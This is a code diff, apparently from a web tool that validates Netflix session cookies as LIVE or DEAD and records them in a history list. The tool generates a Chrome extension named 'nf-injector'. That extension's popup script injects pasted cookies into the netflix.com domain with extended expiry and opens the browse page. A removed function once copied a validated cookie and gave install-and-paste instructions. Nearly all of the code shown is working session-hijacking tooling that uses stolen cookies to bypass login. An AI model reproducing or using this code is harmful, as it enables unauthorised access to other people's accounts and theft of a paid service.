-  var popupJs="document.getElementById('go').onclick=async()=>{var r=document.getElementById('c').value.trim();var s=document.getElementById('s');if(!r){s.textContent='no cookie';return}var parts=r.split(/[;\\n]/);var ok=0;for(var i=0;i<parts.length;i++){var p=parts[i].trim();var eq=p.indexOf('=');if(eq<0)continue;var n=p.substring(0,eq).trim();var v=p.substring(eq+1).trim();if(!n||!v)continue;try{await chrome.cookies.set({url:'https://www.netflix.com/',name:n,value:v,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+604800});ok++}catch(e){}}s.textContent=ok+' set';setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},600)};";
+
+  var popupJs="document.getElementById('go').onclick=async()=>{var r=document.getElementById('c').value.trim();var s=document.getElementById('s');if(!r){s.textContent='no cookie';return}var parts=r.split(/[;\\n]/);var ok=0;var pending=parts.length;parts.forEach(function(p){var eq=p.indexOf('=');if(eq<0){pending--;return}var n=p.substring(0,eq).trim();var v=p.substring(eq+1).trim();if(!n||!v){pending--;return}chrome.cookies.set({url:'https://www.netflix.com/',name:n,value:v,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+2592000},function(){ok++;s.textContent=ok+' set';});});setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},900)};";
+
   var zip=new JSZip();
   zip.file('manifest.json',JSON.stringify(manifest));
+  zip.file('background.js',backgroundJs);
   zip.file('popup.html',popupHtml);
   zip.file('popup.js',popupJs);
-  zip.generateAsync({type:'blob'}).then(function(b){var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='nf-injector.zip';a.click()});
+  zip.generateAsync({type:'blob'}).then(function(b){
+    var a=document.createElement('a');
+    a.href=URL.createObjectURL(b);
+    a.download='nf-injector.zip';
+    a.click();
+  });
 }
 
-function bypassNow(){
-  if(!lastValidCookie){alert('pehle cookie check karo');return}
-  downloadExt();
-  if(navigator.clipboard) navigator.clipboard.writeText(lastValidCookie).then(function(){alert('cookie copied. extension install karo aur paste karo.')});
-}
-
-/* ================= HISTORY ================= */
+/* ===== HISTORY ===== */
 var HIST_KEY='nf_hist_v2';
 
 function loadHistory(){
@@ -727,7 +585,7 @@ function renderHistory(){
     var dt=new Date(e.time).toLocaleString();
     var tag=e.valid?'<span class="tag ok">LIVE</span>':'<span class="tag bad">DEAD</span>';
     var prof=e.profile?('profile: '+escapeHtml(e.profile)):('err: '+escapeHtml(e.error||'?'));
-    html+='<div class="hist-item" data-idx="'+i+'" onclick="openHistoryItem('+i+')">'+
+    html+='<div class="hist-item" onclick="openHistoryItem('+i+')">'+
       tag+
       '<span class="t">'+escapeHtml(dt)+'</span>'+
       '<div class="meta">src: '+escapeHtml(e.src)+' · '+prof+'</div>'+
@@ -765,7 +623,7 @@ function showHistory(){
 }
 function hideHistory(){document.getElementById('historyModal').classList.remove('on')}
 
-/* ================= PDF WORKER ================= */
+/* ===== PDF WORKER ===== */
 if(window.pdfjsLib) pdfjsLib.GlobalWorkerOptions.workerSrc='https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
 </script>
 </body>
